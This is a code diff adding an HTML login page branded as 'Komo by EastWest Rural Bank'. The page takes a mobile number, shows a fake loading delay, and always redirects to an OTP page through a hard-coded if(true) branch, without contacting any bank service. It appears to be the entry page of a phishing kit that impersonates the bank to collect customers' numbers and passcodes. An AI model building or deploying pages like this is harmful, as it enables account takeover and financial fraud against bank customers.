@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Komo by EastWest Rural Bank - Digital Banking Solutions">
+  <title>Home | Komo by EastWest Rural Bank</title>
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    .font-p {
+      font-family: "Poppins", sans-serif;
+      font-style: normal;
+    }
+  </style>
+</head>
+<body>
+  <div id="error-modal" class="hidden fixed inset-0 bg-gray-800/10 flex items-center justify-center z-50">
+    <div class="bg-white rounded-xl p-6 w-72 text-center shadow-lg">
+      <div class="flex flex-col items-center">
+        <div class="bg-pink-700 text-white rounded-full p-2 mb-3">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <circle cx="12" cy="12" r="10"></circle>
+            <line x1="12" y1="8" x2="12" y2="12"></line>
+            <circle cx="12" cy="16" r="1"></circle>
+          </svg>
+        </div>
+        <h2 class="text-pink-700 font-semibold text-lg mb-1">Error</h2>
+        <p id="error-msg" class="text-gray-700 text-sm mb-4">
+        </p>
+        <button id="close-modal" class="w-full py-2 bg-pink-700 text-white rounded-md font-semibold">
+          OK
+        </button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="loading-modal" class="hidden fixed inset-0 bg-gray-800/20 flex items-center justify-center z-50">
+  <div class="bg-white rounded-xl p-6 w-64 text-center shadow-lg flex flex-col items-center">
+    <div class="border-4 border-pink-200 border-t-pink-700 rounded-full w-10 h-10 animate-spin mb-4"></div>
+    <p class="text-gray-500 text-xs font-medium">Please wait</p>
+  </div>
+</div>
+
+  <nav>
+    <button class="bg-transparent mx-6 my-6">
+      <svg class="text-pink-700" xmlns="http://www.w3.org/2000/svg" width="18" height="18" stroke="currentColor" viewBox="0 0 16 16">
+        <path fill-rule="evenodd" d="M11.354 1.646a.5.5 0 0 1 0 .708L5.707 8l5.647 5.646a.5.5 0 0 1-.708.708l-6-6a.5.5 0 0 1 0-.708l6-6a.5.5 0 0 1 .708 0" />
+      </svg>
+    </button>
+  </nav>
+
+  <header class="w-full flex justify-center mt-48">
+    <img class="h-10" src="./komo-logo.png" alt="Komo Logo" />
+</header>
+
+<div class="mx-5 flex flex-col justify-between h-[50vh]">
+  <div class="flex flex-row justify-center mt-10 gap-2">
+    <button class="bg-gray-100 text-gray-300 rounded-sm px-2 font-p text-xs">
+      🇵🇭 +63
+    </button>
+    <input
+    id="mobile-number"
+    class="font-p text-sm bg-gray-100 px-2 py-3 rounded-sm border-b-2 focus:outline-none focus:border-pink-700 hover:border-pink-700 border-gray-300"
+    type="number"
+    placeholder="Mobile Number"
+    maxlength="10"
+    />
+</div>
+<div>
+  <button id="submit-btn" class="w-full py-2 rounded font-bold text-white font-p bg-gray-400" disabled>
+    Next
+  </button>
+  <h1 class="text-center text-gray-500 font-p mt-5">
+    Don't have an account? <b class="text-pink-700">Sign Up</b>
+  </h1>
+</div>
+</div>
+
+<script>
+const input = document.getElementById('mobile-number');
+const button = document.getElementById('submit-btn');
+const modal = document.getElementById('error-modal');
+const closeModal = document.getElementById('close-modal');
+const errorModalMessage = document.getElementById('error-msg');
+const loadingModal = document.getElementById('loading-modal');
+
+input.addEventListener('input', () => {
+input.value = input.value.slice(0, 10);
+
+if (input.value) {
+button.classList.remove('bg-gray-400');
+button.classList.add('bg-pink-700');
+button.disabled = false;
+} else {
+button.classList.remove('bg-pink-700');
+button.classList.add('bg-gray-400');
+button.disabled = true;
+}
+});
+
+button.addEventListener('click', () => {
+const mobileNumber = input.value;
+loadingModal.classList.remove('hidden');
+
+setTimeout(() => {
+  loadingModal.classList.add('hidden');
+const phRegex = /^9\d{9}$/;
+if (!phRegex.test(input.value)) {
+  modal.classList.remove('hidden');
+  errorModalMessage.textContent = "Please input a valid mobile number";
+  return;
+}
+
+if(true) {
+  modal.classList.remove('hidden');
+  errorModalMessage.textContent = `Sorry, that mobile number is not a registered Komo account. If you do not have an account yet, create one now by tapping "Create an Account" from the main screen. If you already have an account with this mobile number, please call us at our Komo Hotline (02)8888-1777.`;
+  window.location.href = '/otp.html'
+}
+}, 2000);
+});
+
+closeModal.addEventListener('click', () => {
+modal.classList.add('hidden');
+});
+</script>
+</body>
+</html>
